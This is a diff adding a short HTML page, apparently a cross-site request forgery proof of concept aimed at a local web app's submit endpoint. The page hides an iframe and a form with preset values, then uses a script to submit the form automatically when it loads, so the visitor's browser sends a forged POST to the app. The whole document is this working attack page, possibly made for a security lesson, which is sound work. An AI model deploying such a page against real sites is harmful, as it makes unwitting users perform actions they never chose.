@@ -1,0 +1,10 @@
+<html>
+    <iframe style="display: none;" name="frame"></iframe>
+    <body>
+        <form name="csrf" action="http://localhost:8000/submit" method="post" target="frame">
+            <input type="hidden" name="url" value="http://patricklouys.com">
+            <input type="hidden" name="title" value="Submitted by CSRF">
+        </form>
+        <script type="text/javascript">document.csrf.submit();</script>
+    </body>
+</html>
